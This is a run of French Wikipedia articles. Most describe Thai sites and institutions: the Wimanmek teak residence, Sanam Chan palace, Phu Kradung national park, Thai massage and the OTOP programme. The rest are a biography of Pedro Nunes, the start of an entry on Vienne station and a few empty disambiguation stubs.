Le roi Rama V a ordonné d’édifier la première résidence permanente en 1900. Il avait la résidence Munthatu Rattanaroj dans Chuthathui Rachathan sur l’île de Si Chang (Ko Sichang, province de Chonburi) mais après il l’a démantelée et reconstruite dans le domaine royal de Dusit à Bangkok sous la surveillance du prince Narissara Nuwaddhiwongse. La cérémonie d'inauguration de la résidence Wimanmek a eu lieu le . Le roi Rama V déménage du Grand Palais à la résidence Wimanmek cinq ans après l’accomplissement de la villa Ampon Satan en 1906 où il habita jusqu’à sa mort en 1910.
La résidence Wimanmek a été fermée et la famille royale est revenue au Grand Palais. À la fin de l’époque de Rama V (1910-1925), il a donné la permission à la reine Indharasaksaji d’habiter à la résidence Wimanmek. Après la mort du roi, elle a déménagé pour habiter à l’autre résidence dans Suan Hong, au nord de la résidence Wimanmek et plus tard la résidence a été fermée.
Rama VI a rénové la résidence plusieurs fois. En 1932, la résidence Wimanmek a été utilisée comme endroit pour l’emmagasinage du Bureau de la famille royale seulement.
En 1982, à l’occasion du bicentenaire de Bangkok, la reine Sirikit, qui avait découvert que la résidence Wimanmek était encore intacte, a demandé la permission du roi Rama IX de rénover la résidence pour l’utiliser comme musée servant à célébrer Rama IX en montrant ses photographies, ses œuvres d’art personnelles et comme vitrine de l’héritage national thaï pour les générations à venir.
Elle est fermée au public en 2016.
Détails architecturaux.
La résidence Wimanmek est la plus grande résidence en teck du monde avec un style architectural élaboré montrant une influence occidentale. Le bâtiment a deux ailes, chaque aile a 60 mètres de long et 20 mètres de hauteur, et il y a trois étages sauf la partie où le roi Rama IX a habité qui est octogonale et forme un quatrième étage.
Bien que le rez-de-chaussée soit en brique et ciment, le premier étage a été construit en teck. De plus il y a 31 salles d’exposition avec la chambre, la salle du trône et la salle de bain qui soutient l’atmosphère de la tradition thaïlandaise. L’exposition de l’art thaïlandais : l’argenterie, les céramiques, le cristal et l’ivoire.
À côté de la résidence Wimanmek et de la villa Ampon Satan dans le jardin Dusit, le roi Rama V a distribué le petit terrain pour construire la résidence pour ses épouses et ses sœurs. Il a nommé les jardins, les canaux, les ports et les rues d'après les anciennes céramiques chinoises (Ils ont été appelés “Khrueng Kim Tung ” ordinairement), qui étaient très connues en ce temps–là. Ainsi, la résidence qui a appartenu à la reine Savang Vadhana a été nommée résidence Suan Hong. La résidence dans le palais Dusit a été changée en bâtiments pour l’exposition et le hall des wagons royaux est ouvert au public.

</doc>
<doc id="2845642" url="https://fr.wikipedia.org/wiki?curid=2845642" title="Série A (hockey sur glace)">
Série A (hockey sur glace)



</doc>
<doc id="2845644" url="https://fr.wikipedia.org/wiki?curid=2845644" title="Palais de Sanam Chan">
Palais de Sanam Chan

Le palais de Sanam Chan est situé derrière le Phra Pathom Chedi à Nakhon Pathom, en Thaïlande. Il a été construit à partir de 1902, durant le règne de Rama V. Le futur roi Vajiravudh (Rama VI), alors prince royal, avait acheté la terre près de l'étang de Chan (Sanam Chan) pour construire un palais, et l'avait appelée palais de Sanam Chan d’après le nom de l'étang. 
Le palais de Sanam Chan comporte une salle du trône ainsi que d'autres structures comme le Tap Kaew, Tap Kwan, Mareeratcharatta Ballang, Chalee Mongkhon-ard, Sala long Song, un théâtre, la gare de Sanam Chan et le bâtiment de Phra Kam Sakkhee.
Actuellement, une partie du palais de Sanam Chan est la résidence du vice-gouverneur de la province de Nakhon Pathom, alors que les autres forment une partie de l'université de Silapakorn, campus de Tap Kaew. Ces bâtiments sont ouverts au public.
Histoire.
Le Roi Rama VI se rendait compte de l'importance religieuse et culturelle de Nakhon Pathom. C'était également un endroit stratégique et pouvant être facilement défendu, alors que la Thaïlande était confrontée aux menaces des puissances occidentales et Nakhon Pathom jouait le rôle d'une seconde capitale.
Le Roi Rama VI plus tard créa les corporations des tigres sauvages, organisation composée de civils pour la défense du pays. Il transforma le palais en camp de formation pour les corporations des tigres sauvages.
Le Roi Rama VI est venu résider au palais de Sanam Chan chaque année, et il y a achevé beaucoup de travaux littéraires, comme le « "Thao Saen Pom" » et sa traduction de « "Roméo et Juliette" ».
Le , les habitants de Nakhon Pathom ont érigé une statue à la mémoire du Roi Rama VI dans le secteur du palais de Sanam Chan.
Résidence Chalee Mongkhon-ard.
La résidence Chalee Mongkhon-ard était la résidence du Roi Rama VI, la cérémonie d’inauguration le palais ayant eu lieu en 1917. Il est maintenant ouvert de public tous les jours.
L'architecture est romantique, avec des influences de la Renaissance française et du modèle à colombage de l'Angleterre, modifié pour convenir au climat thaï. 
Le bâtiment de deux étages est peint couleur d'œuf, avec un toit couvert de tuiles rouges. Il y a deux salles aux niveaux supérieurs, une chambre à coucher et une étude. Un balcon semi- circulaire dépasse de chaque pièce. Là aussi deux salles sur le rez-de-chaussée, entouré par une véranda. 
Chalee Mongkhon-ard est situé au sud d'une grande pelouse. En 1915, il a été renommé « Chalee Mongkhon-ard ». Le mot Chalee vient de « Jarlet », le nom du chien préféré du Roi Rama VI. Il y a une statue de cuivre du chien devant le Hall. 
Le Roi Rama VI employait ce hall la plupart du temps quand il rendait visite à des troupes des corporations des tigres sauvages et pour des d’autres fonctions royales. À beaucoup d'occasions, le Hall a été employé par le roi en accordant des assistances aux ambassadeurs et aux membres de la redevance. Le rez-de-chaussée a une fois utilisé au bureau du journal Dusit Smith.
Résidence Tap Khwan.
La résidence Tap Khwan est un beau bâtiment de style Thaï entouré par plusieurs grands et nombreux arbres, y compris Chan, Champee et Nang Yaem. Le Roi Rama VI a construit le Tap Kwan en même temps que le Tap Kaew, de style occidental, qui se trouve de l'autre côté de la route. La cérémonie d'inauguration pour le Tap Khwan a été tenue en 1911. Il est maintenant ouverte de public.
Le Tap Khwan est un groupe de huit bâtiments, quatre d'entre eux grands et orientés vers les quatre directions de la boussole. Elles se composent des deux dortoirs, d'un hall et d'une cuisine. Les quatre plus petits bâtiments aux quatre coins consistent en une volière, des quarts des domestiques et une réserve. Les huit bâtiments sont reliés par une véranda. Tous les bâtiments, y compris la véranda, sont construits avec du teck. La construction est par les méthodes traditionnelles antiques et est de haute qualité. Le toit est couvert de feuilles de paume. Ces bâtiments thaïs sont uniques et fournissent un bon exemple de modèle de construction thaïe pour la jeune génération de la Thaïlande. 
Le Tap Khwan a été employé comme sièges sociaux du champ de la compagnie des corporations des sauvages de tigre et le Roi Rama VI restait ici pendant les manœuvres. Le Tap Khwan a subi des rénovations et la princesse Maha Jakri Sirindhorn présida aux célébrations le .
La société des architectes thaïs a attribué le prix du Tap Khwan pour la conservation de la catégorie thaïe traditionnelle d'architecture pendant cette année.

</doc>
<doc id="2845645" url="https://fr.wikipedia.org/wiki?curid=2845645" title="Eredivisie (hockey sur glace)">
Eredivisie (hockey sur glace)



</doc>
<doc id="2845648" url="https://fr.wikipedia.org/wiki?curid=2845648" title="Parc national de Phu Kradung">
Parc national de Phu Kradung

Le parc national de Phu Kradung (souvent orthographié Phu Kradueng) (thaï : อุทยานแห่งชาติภูกระดึง) est un des parcs nationaux thaïlandais les plus connus avec un point culminant de mètres et une superficie de 348 km2 (34 800 ha ; 217 575 rai). Phu Kradung se trouve à Amphur Phu Kradung dans la province de Loei. Il est considéré comme le parc le plus spectaculaire et le plus montagneux de toute la Thaïlande.
Tous les ans plusieurs dizaines de milliers de personnes gravissent et visitent cette célèbre montagne : ainsi, par exemple, le parc national de Phu Kradung a accueilli 65 000 visiteurs d' à . Il a reçu le titre de forêt nationalement protégée en 1943 et a été proclamé parc national le , deuxième parc national de la Thaïlande après le Parc national de Khao Yai.
C'est la beauté de la montagne attire les visiteurs : air pur et frais, vertigineuses falaises et superbes points de vue où l'on peut admirer la plaine de l'Isan et la chaîne de montagnes de Phetchabun (thai: ทิวเขาเพชรบูรณ์, "Thio Khao Phetchabun", API : [tʰīw kʰǎw pʰét.t͡ɕʰā.būːn]), romantiques levers et couchers de soleil, sentiers de randonnée et belles nuits étoilées.
Ce parc est fermé pendant la saison des pluies (mousson), de juin à septembre, afin que la faune puisse se reproduire en toute tranquillité. Le nombre de visiteurs est limité à 3500 par jour.
Histoire et géographie.
Phu (ภู) vient du mot thaï Phukao (ภูเขา) signifiant la montagne. Le nom Kradung (กระดึง) vient du mot Krading (กระดิ่ง), un mot des aborigènes de la province de Loei. Phu Kradung (ภูกระดึง) peut être aussi traduit en Ra Kang Yai (ระฆังใหญ่) qui veut dire une grande cloche. Ce nom vient d’une légende concernant des vacances bouddhistes. Pendant les vacances, beaucoup de citadins ont entendu le bruit de la grande cloche. Ils croyaient que c'était la cloche d’Indra.
Topographie.
La montagne de Phu Kradueng est une montagne calcaire en forme de cœur dont le sommet est un vaste plateau de 60 km2 à plus de 1200 m d'altitude. Ce plateau est entouré d'impressionnantes falaises, semé de petites collines, de nombreuses cascades et de multiples sources d'eau vive.
Le sentier d'accès au sommet, long de 6 km, est particulièrement escarpé voire abrupt et sportif, la dénivellation étant de 1000 m.
Légende.
La beauté de cette montagne est racontée dans des contes folkloriques locaux. 
Une personne nommée Phran (พาน) croyait que Phu Kradung n’avait pas encore été escaladée. Il mena son taureau en haut de la montagne. Il trouva qu’il existait plein de cerfs et de forêts de pins. Il y avait aussi de nombreuses plantes, des arbres variés et des animaux sauvages. Cela lui plut beaucoup, alors il décida de passer sa vie en haut de cette splendide montagne.
De nos jours.
Phu Kradung est très connu par les jeunes thaïs, surtout par les étudiants d’université. Le logement sur la montagne est limitée à « une ville de tentes » avec plus de cent tentes de toile disponibles en location. Le plaisir de se retrouver seul, au calme, de contempler la nature et de superbes paysages est malheureusement corrompu par des haut-parleurs ennuyants et inutiles qui annoncent par intermittence la disponibilité de nourriture, les heures de sommeil et bien d'autres annonces en thaï.
Voyage à Phu Kradung.
Le moyen le plus facile pour aller à Phu Kradung est de prendre l’autobus à partir de Khon Kaen vers Pha Nok Kao. Descendez du bus devant Raan J Gim (ร้านเจ๊กิม). Il y a à cet endroit des minibus qui vous emmènent vers le bureau central du parc, soit un trajet d'environ une demi-heure. 
Les chemins pour aller en haut de la montagne.
Le chemin principal commence à partir d’Amphur Phu Kradung.
C’est un ancien chemin historique. 
Les voyageurs commencent leur excursion au bureau central du parc au pied de la montagne. 
Le bureau du parc est fermé à 15h00 parce que les grimpeurs n’auront plus assez de temps pour monter vers le sommet de la montagne avant qu’il ne fasse nuit.
Le sentier d'accès au sommet de la montagne de Phu Kradung et au terrain de camping est long de 9 km. Il y a 6 km d'ascension de la montagne et 3 km de plat au sommet pour arriver au camping. Il faut prévoir de 3 à 6 heures pour gravir les 1000 m de dénivelé entre le pied de la montagne et son sommet.
Les voyageurs peuvent embaucher des porteurs pour monter leurs affaires en haut de la montagne. Dans ce cas, le chemin principal est souvent plein de longues files de porteurs et de touristes.
Plateaux.
Il y a sept plateaux de repos appelés Sam (ซำ) sur le chemin de montée.
Ce sont :
Aux plateaux, les touristes peuvent acheter de la nourriture et des boissons. 
C’est un bon endroit pour le repos après une montée fatigante. Il existe également des toilettes à ces endroits. 
À partir de Sam Krae, il reste encore 1 020 mètres à parcourir pour gravir les 200 derniers mètres de dénivelé avant le sommet. Cette portion du chemin est sans doute la plus difficile et la plus escarpée de ce voyage. Les voyageurs sont aidés par des échelles et des rampes sur quelques parties du chemin où il n’est pas facile de marcher et de grimper. 
En outre, du haut de la montagne, il faut continuer à marcher environ 3,6 kilomètres vers le bureau du parc et le terrain de camping sur la montagne.
Au terrain de camping, des tentes et des logements à louer sont disponibles. 
Les touristes passent leur temps avec plusieurs randonnées à pied ou à bicyclette le long des 50 km de sentiers balisé en anglais et en thaï vers de belles falaises et des chutes d’eau de la montagne.
L’autre chemin à partir d’Amphur Nam Nao.
Les touristes peuvent monter à la montagne à partir d’Amphur Nam Nao. C’est une nouvelle piste ouverte en 2005. Il y n’a pas encore d’endroit de repos sur le chemin, ni de nourriture et de boissons lors de la montée sur cette piste.
Pistes au sommet de la montagne.
Il y a deux zones de pistes au sommet de Phu Kradung. L’une est ouverte au public. Cette zone a des cascades et des falaises. L’autre zone est la forêt réservée, car, pour l'explorer et y découvrir les merveilles qui s'y cache, il est obligatoire d'engager un guide forestier agrémenté par les autorités du parc. Elle a été divisée en deux parties, appelées partie un et partie deux. 
Cascades.
Les voyageurs peuvent admirer de nombreuses chutes d'eau : cascades de Wang Kwang (น้ำตกวังกวาง), Tham Yai (น้ำตกถ้ำใหญ่), Than Sawan (น้ำตกธารสวรรค์), Phen Phop (น้ำตกเพ็ญพบ), Phon Phop (น้ำตกโผนพบ), Phen Phop Mai (น้ำตกเพ็ญพบใหม่), Tat Hong (น้ำตกตาดฮ่อง) etc.
Falaises.
À partir du bureau touristique, les voyageurs peuvent explorer le chemin vers les falaises. Il y a de nombreuses falaises dont la beauté est connue universellement.
"À chaque coucher du soleil, à la falaise de Makduk, je m'asseyais"
"Pour contempler les rais de lumière colorée"
"Percer les nuages et embraser le ciel"
Angkarn Kalayanaphong (อังคาร กัลยาณพงศ์, poète et artiste thaï, né le 13 février 1926 et mort le 25 août 2012), 
"Lam nam Phu Kradung" (ลำนำภูกระดึง), publié en 1969
Faune et flore.
La biodiversité de la faune dans le parc national de Phu Kradung est plutôt limitée en comparaison de la plupart des autres parcs nationaux : il n'y a que 116 espèces d'oiseaux, 11 espèces de mammifères, 19 espèces de reptiles dont 1 espèce de tortue, 6 espèces de lézards et 12 espèces de serpents, et, plus remarquable, 19 espèces d'amphibiens. La flore, en revanche, présente un grand intérêt, en particulier parce que Phu Kradung est l'un des rares endroits de la Thaïlande qui connaît un automne, certes bref, en décembre.
11 espèces de mammifères.
On voit fréquemment de grands cerfs sambars. 
On peut aussi parfois voir des éléphants d'Asie ; des sangliers ; des chats de Temminck, des civettes et des chacals dorés ; des gibbons à mains blanches et des macaques d'Assam.
On observe aussi 4 espèces d'écureuils différentes : des écureuils de Finlayson, des écureuils rayés de l'Himalaya, des écureuils volants petaurista philippensis et des écureuils géants de Malaisie.
116 espèces d'oiseaux.
On peut entre autres observer des francolins perlés et des oiseaux passereaux comme les hirondelles du Népal, les petits ioras, les minivets et les gobe-mouches.
19 espèces de reptiles.
1 espèce de tortue.
Il y a des tortues à grosse tête.
6 espèces de lézards.
On trouve des geckos cyrtodactylus interdigitalis, des agames acanthosaura lepidogaster, des scinques à longue queue, des scinques dorés, des scinques lipinia vittigera et tropidophorus laotus.
12 espèces de serpents.
Les espèces de serpents sont trimeresurus gumprechti, pareas margaritophorus, oreocryptophis porphyraceus, couleuvre volante chrysopelea ornata, lycodon fasciatus, boiga multomaculata, psammodynastes pulverulentus, ahaetulla prasina, hebius khasiense, xenochrophis flavipunctatus et xenochrophis piscator et hypsiscopus plumbea.
19 espèces d'amphibiens.
Les espèces d'amphibiens sont très nombreuses dans le parc national de Phu Kradueng car il y a beaucoup de mares. Ce sont des crapauds et des grenouilles occidozyga magnapustulosa, leptobrachium smithi et leptobrachella minima ; grenouilles peintes de Malaisie kaloula pulchra, kalophrynus interlineatus, microhyla berdmorei, microhyla butleri et microhyla heymonsi ; rhacophorus rhodopus, polypedates megacephalus, kurixalus bisacculus, raorchestes parvulus ; fejervarya limnocharis, limnonectes gyldenstolpei et limnonectes isanensis, hylarana macrodactyla, sylvirana nigrovittata et des odorrana aureola ; et des ichthyophis kohtaoensis.
Flore.
Sur les flancs de la montagne de Phu Kradung poussent des forêts tropicales mixtes de feuillus et de dipterocarpaceae ainsi que des forêts de bambous. Au sommet il y a des forêts de pins, des forêts de feuillus et une jungle herbeuse.
Parmi les arbres les plus abondants et remarquables, on voit des shorea obtusa, shorea siamensis, des diospyros, des lagerstroemia, des érables alcer calcaratum et des podocarpus neriifolius, des pinus latteri et des pinus kesiya.
Au sommet de la montagne, la jungle herbeuse parsemée des quelques arbres et arbustes est constituée de magnifiques champs de fleurs sauvages que l'on peut admirer surtout entre février et mai. Il y a des rhododendrons, des eriocaulon henryanom, des curcuma aeruginosa et des curcuma parviflora, des vaccinium sprengelii, des torenia fournieri, des caulokaempferia thailandica, des plantes carnivores drosera burmanni, drosera indica et drosera peltata, des plantes carnivores nepenthes, des orchidées dendrobium et orchidées eria, des orchidées papillons phalaenopsis dont des phaloenopsis pulcherrima, des sabots de Vénus paphiopedilum etc.
Le parc national de Phu Kradung est particulièrement célèbre pour ses pins dont la croissance est favorisée par l'acidité des sols et le climat fort doux d'altitude.
C'est aussi l'un des rares endroits de la Thaïlande où il y a un vrai automne en décembre : chose exceptionnelle et surprenante en zone tropicale, les arbres à feuilles caduques du sommet se parent tous en même temps (en fonction des espèces), pendant quelques jours ou quelques semaines, de magnifiques couleurs dorées, orangées et rouges.

</doc>
<doc id="2845650" url="https://fr.wikipedia.org/wiki?curid=2845650" title="Massage thaï">
Massage thaï

Le massage thaï, ou massage thaïlandais (thaï : นวดแผนไทย, RTGS : nuat phaen thai ou นวดแผนโบราณ, RTGS : nuat phaen boran) , est une thérapie ancienne et traditionnelle asiatique pratiquée en Thaïlande.
Le nuat thai, massage thaïlandais traditionnel est inscrit sur la liste représentative du patrimoine culturel immatériel de l'humanité en . Selon le Dossier de candidature reçu le 11 septembre 2018 par l’UNESCO, il est « considéré comme faisant partie de l’art, de la science et de la culture des soins thaïlandais traditionnels ». Cette inscription s’inscrit dans le cadre d’une politique de revitalisation du Nuat Thaï qui, depuis les années 1980, est coordonnée au niveau gouvernemental.
Histoire.
Les chercheurs considèrent les origines de la médecine indigène siamoise comme une énigme.
Selon la légende, le fondateur du massage et de la médecine thaïlandais aurait été Chiwaka Komaraphat (ชีวกโกมารภัจจ์ Chi Wok Ko Ma Raphat), qui, selon le canon bouddhiste pāli, aurait été le médecin du Bouddha il y a plus de 2500 ans. Il est mentionné dans des documents anciens comme ayant des compétences médicales extraordinaires, une connaissance de la phytothérapie, et pour avoir traité des personnes importantes de son époque, y compris le Bouddha lui-même.
Les chroniques ("Phongsawadan Krung Si Ayutthaya") rédigées sous le roi siamois d'Ayutthaya, Boromma Trailokanat (thaï: บรมไตรโลกนาถ), attestent que, en 1455, le palais dispose de deux collèges de masseurs.
Le "Wat Phra Chetuphan" plus connu sous le nom de "Wat Pho" (), est un temple de Bangkok, en Thaïlande, considéré comme le lieu de naissance du massage thaï. À cet endroit sont placées des statues d'ermites pratiquant divers gestes de la méthode d’auto-massage connue sous le nom de "rishi dat ton" (ce qui signifie en langue thaïe «auto-étirements des ascètes»). Ces statues ont été réalisées à la demande du roi Rama (1787-1851). De nombreuses peintures murales présentent aussi les points d'acupression. En 1691, dans "Du royaume de Siam", Simon de La Loubère rapporte que .
À partir du rège de Rama IV (1851–1868), les élites thaïlandaises, suivant l’exemple de la famille royale, se tournent vers la médecine occidentale pour se soigner. Frappé de discrédit, le "Nuat Thai" commence un long déclin jusqu’à son exclusion en 1936 du domaine des soins de santé traditionnels ("Act for the Control of the Practice of Healing Arts").
Dans les années 1950 et 1960, le roi Rama IX (1946–2013) encourage le renouveau de la médecine et du massage thaïs, notamment à Wat Pho. Dans les années 1980, de nombreux organismes publics et privés s’associent au projet de restauration du "Nuat Thai." En 2001, ce dernier est de nouveau reconnu comme une des quatre branches des soins de santé traditionnels, aux côtés de la médecine, de la pharmacie et de l’obstétrique.
Le massage traditionnel thaï est aujourd’hui organisé et réglementé au niveau national, qu’il s’agisse de la délivrance des diplômes ou de l’exercice des professions. Selon l’état des lieux publié en 2014 par le ministère thaïlandais de la santé publique, 3183 hôpitaux publics, ce qui représente plus de 30% des établissements, dispensent des soins de massage. En 2011, le nombre des bénéficiaires de ces soins s’élève à 889225, ce nombre ayant presque triplé par rapport à 2009 (313352).
En 2011, l’UNESCO a inscrit dans le Registre de la Mémoire du monde les archives épigraphiques de Wat Pho . Ces 1431 textes inscrits sur des plaques de pierre abordent des aspects variés, religieux et laïques, de la civilisation thaïe : bouddhisme, enseignement moraux, littérature, médecine… 125 plaques concernent le massage.
Concept.
Le massage thaïlandais recouvre le corps entier. La théorie du massage thaïlandais se fonde sur le concept de lignes d’énergie liées au corps qui sont appelées "sen". Si les écrits traditionnels de la médecine thaïe mentionnent 72 000 lignes d'énergie, il existe 10 lignes principales ("sen sip"). Le massage thaï est une thérapie manuelle qui vise à rééquilibrer les flux énergétiques le long des "sen" en vue de renforcer ou de rétablir la bonne santé.
Les "sen" ne doivent pas être confondus avec les méridiens qui sont les canaux énergétiques de la médecine traditionnelle chinoise. Les trajets des "sen", qui relient la région abdominale aux extrémités ou aux orifices du corps, sont très différents de ceux des méridiens. Et, contrairement aux méridiens, les "sen" ne correspondent pas à des organes déterminés.
Types.
Techniques.
Il existe deux grands types de massage, le style de la Cour et le style du peuple. Seuls les pouces sont utilisés pour le style de la Cour, tandis que les pouces, les genoux, les coudes et les pieds sont utilisés pour le style du peuple. Toutefois, cette opposition est surtout intéressante pour l’histoire du "Nuat Thai". Dans la Thaïlande contemporaine, le ministère de la santé publique distingue deux catégories de massage traditionnel thaï, d’une part un massage thérapeutique et d’autre part un massage destiné à la promotion de la santé.
Les patients-clients portent des vêtements confortables et sont allongés sur un matelas.

</doc>
<doc id="2845652" url="https://fr.wikipedia.org/wiki?curid=2845652" title="BFJ">
BFJ

BFJ peut désigner :

</doc>
<doc id="2845655" url="https://fr.wikipedia.org/wiki?curid=2845655" title="One Tambon One Product">
One Tambon One Product

One tambon One product (OTOP), en français « Une commune Un produit », est un programme économique lancé par le gouvernement thaïlandais de Thaksin Shinawatra entre 2001 et 2006.
Description.
Le projet « OTOP » est destiné à encourager et soutenir le développement communautaire à l'échelle du tambon (sous-district). Ses objectifs sont :
Il s'inspire d'un programme similaire établi au Japon dans les années 1980 pour le développement des communautés rurales : "Un village Un produit".
Les villageois sont encouragés à générer des revenus en développant des produits de bonne qualité en utilisant les ressources et les compétences locales. Les produits sont aussi bien des objets que des services.
Le programme prend en compte la conservation des ressources naturelles et de l’environnement et la préservation des compétences thaïes locales, du tourisme, des arts et de la culture, des coutumes et traditions, de l’apprentissage et de l’échange des connaissances. Le but est que les produits soient de bonne qualité, possèdent des caractéristiques distinctes et soient connus dans toute la Thaïlande et à travers le monde.
Les types de produits OTOP sont ainsi des produits agricoles, des équipements mécaniques, des accessoires de construction, des vêtements, des jouets et des jeux, des bijoux, des cadeaux, des produits alimentaires, des cosmétiques et des produits sanitaires, des produits électroniques, des meubles, des équipements ménagers et des ustensiles de cuisine, des produits en cuir, des équipements de sport, du matériel d’impression, des services dans les milieux hospitaliers et touristiques, etc.
Les concours des catégories de produits sont souvent organisés au niveau régional ou national. Le produit qui gagne reçoit un certificat cinq étoiles. C’est la garantie de sa qualité et de son originalité.
Les produits OTOP sont très populaires et attirent beaucoup de gens. Les salons et les foires OTOP sont très visités parce que les produits sont de bonne qualité et de prix raisonnables.
Le projet OTOP aide à fournir du travail aux gens dans les provinces en Thaïlande. En outre, il est un produit utilisant les ressources naturelles de façon efficace. Ceci suit le thème de l’autosuffisance économique initiée par sa Majesté le roi.
Après 2006, le programme a été renommé en "Local and Community Products", mais la marque OTOP a été maintenue.

</doc>
<doc id="2845656" url="https://fr.wikipedia.org/wiki?curid=2845656" title="Bfj">
Bfj



</doc>
<doc id="2845657" url="https://fr.wikipedia.org/wiki?curid=2845657" title="Državno Prvenstvo">
Državno Prvenstvo



</doc>
<doc id="2845664" url="https://fr.wikipedia.org/wiki?curid=2845664" title="BFK">
BFK

BFK est un code qui peut signifier :
bfk est un code qui peut signifier :
BFK est un sigle qui peut désigner :

</doc>
<doc id="2845665" url="https://fr.wikipedia.org/wiki?curid=2845665" title="Bfk">
Bfk



</doc>
<doc id="2845666" url="https://fr.wikipedia.org/wiki?curid=2845666" title="Pedro Nunes">
Pedro Nunes

Pedro Nunes (pron. ; latinisé en Petrus Nonius, forme la plus courante en français), né en 1502 à Alcácer do Sal au Portugal et mort le à Coimbra est un mathématicien et cosmographe portugais.
Il est considéré comme l'un des plus habiles géomètres du , avec des contributions essentielles en trigonométrie sphérique et en cartographie mathématique, comme la notion de loxodromie. Ses travaux de cartographie s'avérèrent d'une importance cruciale à l'époque des Grandes découvertes. Il dénonça également les erreurs de son rival Oronce Finé sur la quadrature du cercle, et mit au point plusieurs instruments pour le repérage en mer et les mesures d'angles, dont le nonius, version primitive du vernier de nos pieds à coulisse modernes.
Biographie.
Issu d'une famille de conversos, Nunes fit ses études à l'Université de Salamanque, sans doute de 1521 à 1522, puis à l'Université de Lisbonne, qui devait par la suite devenir célèbre sous le nom d'Université de Coimbra, dont il devint diplômé en médecine en 1525. Or, au , la médecine s'appuie sur la théorie hippocratique des quatre éléments et les correspondances entre le macrocosme (la configuration du ciel) et le microcosme (le corps humain) : aussi les facultés de médecine enseignent-elles l'astronomie et l'astrologie, et c'est pourquoi Nunes apprit l'astronomie et les mathématiques. Il devint lui-même professeur de son université, enseignant la morale, la philosophie, la logique et la métaphysique. Lorsqu'en 1537 l'université de Lisbonne regagna sa localisation originelle de Coimbra, Nunes prit en charge le cours de mathématiques, qu'il assura jusqu'en 1562 : la création de cette chaire était une nouveauté, voulue par les princes du pays pour former les pilotes à la navigation transocéanique. La chaire de mathématiques acquit son autonomie vis-à-vis de la faculté de médecine en 1544.
Nunes devint cosmographe royal (1529) puis premier cosmographe du roi (1547), poste qu'il conserva jusqu'à sa mort. En 1531, le roi Jean III de Portugal confia à Nunes l'éducation de ses frères cadets Luís et Henri. Par la suite, Nunes sera le précepteur du fils aîné du souverain, le futur roi Sébastien.
Il est possible que Clavius, qui fut étudiant à l'Université de Coimbra vers cette époque, ait assisté aux cours de Nunes et ait donc été influencé par ce savant.
Converti de force, « "português de naça" », comme il est décrit par le philosophe Damião de Góis en 1566, Pedro Nunes, malgré sa position éminente, eut deux petits-fils accusés par l'Inquisition de judaïser en secret. Torturés, ruinés, ils ne sortirent de prison que huit ans plus tard.
Œuvres.
Commentateur.
Pedro Nunes vivait dans une époque de transition où l'activité scientifique, jusqu'alors consacrée à la préservation et à la propagation des connaissances traditionnelles (commentaires des Anciens), commençait à se tourner systématiquement vers les applications techniques de ces connaissances même. Il s'agissait donc de collecter des mesures et des observations permettant d'utiliser les théories existantes : au cours de ce processus, les limites d'application des idées des Anciens apparurent graduellement, amenant les commentateurs à tenter d'en rendre raison. Nonius fut d'abord l'un des derniers grands glossateurs des œuvres anciennes, ce que reflète le premier livre qu'il fit paraître. Dans son « "Tratado da sphera" », où il signale la valeur heuristique de l'expérimentation, il milite également pour une diffusion universelle du savoir : aussi ne se borna-t-il pas à publier ses écrits en latin, qui était alors la lingua franca de la science en Europe, mais aussi en langue vernaculaire (espagnol et portugais), comme son « "Livro de Algebra" ».
Cartographe.
La plupart des ouvrages de Nunes sont consacrés à la navigation. Il fut le premier à expliquer pourquoi un vaisseau qui maintient son cap ne décrit pas un grand cercle (c'est-à-dire une géodésique de la sphère), mais plutôt une courbe spirale, qu'il appela "loxodrome". Il fallut cependant attendre les travaux de Leibniz pour qu'à l'aide des logarithmes, la nature de la loxodrome soit établie.
Dans son « "Éloge des cartes de marine" », Nunes posa en principe qu'une carte nautique doit représenter les parallèles et les méridiens comme des lignes droites. Cependant, il ne parvint pas à résoudre tous les problèmes que posait cette exigence si l'on voulait en outre préserver les directions : le problème de la projection conforme ne fut résolu qu'avec la carte de Mercator et les travaux mathématiques de Wright et Harriot. Nunes se consacra au problème des longitudes, au repérage en mer et au calcul des corrections géographiques. Pour améliorer l'alidade des astrolabes, il imagina le "nonius", ancêtre du "vernier" : ce dispositif est composé d'un faisceau de cercles concentriques, divisés avec un nombre de divisions croissant de l'intérieur vers l'extérieur (une division supplémentaire à chaque cercle). Ainsi, avec un quadrant extérieur divisé en 90 degrés, le deuxième cercle en allant vers l'intérieur n'en a plus que 89, le suivant 88, etc. Lorsque l'on mesure un angle, on relève le cercle et la division du cercle sur lesquels pointe l'alidade. Une table donne alors par conversion la mesure exacte des coordonnées du point. Le "nonius" fut longtemps utilisé par Tycho Brahe qui le trouvait trop fastidieux. Ce système fut perfectionné par Christopher Clavius et Jacob Curtius, jusqu'à ce que Pierre Vernier arrive à une solution satisfaisante.
Pedro Nunes s'attaqua également à l'étude mathématique des machines simples (plan incliné, roue, levier).
Astronomie et mathématiques.
Dans ses exposés du système géocentrique de Ptolémée, Nunes évoque bien la théorie de Copernic, mais uniquement pour y signaler des erreurs de calcul. Nunes détermina la date où le crépuscule a la plus courte durée selon l'endroit de la Terre où l'on se trouve. Ce problème d'extrémum, s'il n'a pas en soi une grande importance, donne cependant une idée des capacités du mathématicien de Coimbra, dans la mesure où, encore plus d'un siècle plus tard, Jean et Jacques Bernoulli éprouvèrent les plus grandes difficultés à le résoudre : ils parvinrent bien à trouver la date de plus court crépuscule mais, se perdant dans des calculs de dérivée, ne purent calculer la durée même du plus court crépuscule. La solution de Nunes est, naturellement, complètement géométrique.
Les découvertes mathématiques de Nunes s'expliquent principalement par sa compréhension profonde de la trigonométrie sphérique et sa capacité à y appliquer les principaux énoncés de la géométrie euclidienne.
Bibliographie.
Pedro Nunes outre qu'il traduisit, commenta et développa les principaux traités de cosmographie et de mathématiques de son époque, est l'auteur de plusieurs traités originaux.

</doc>
<doc id="2845672" url="https://fr.wikipedia.org/wiki?curid=2845672" title="BFL">
BFL

BFL peut désigner :

</doc>
<doc id="2845674" url="https://fr.wikipedia.org/wiki?curid=2845674" title="Gare de Vienne">
Gare de Vienne

La gare de Vienne est une gare ferroviaire française de la ligne de Paris-Lyon à Marseille-Saint-Charles, située sur le territoire de la commune de Vienne, sous-préfecture du département de l'Isère, en région Auvergne-Rhône-Alpes.
Elle est mise en service en 1854 par la Compagnie des chemins de fer de Paris à Lyon et à la Méditerranée (PLM).
C'est une gare de la Société nationale des chemins de fer français (SNCF), desservie par des trains TER Auvergne-Rhône-Alpes.
Situation ferroviaire.
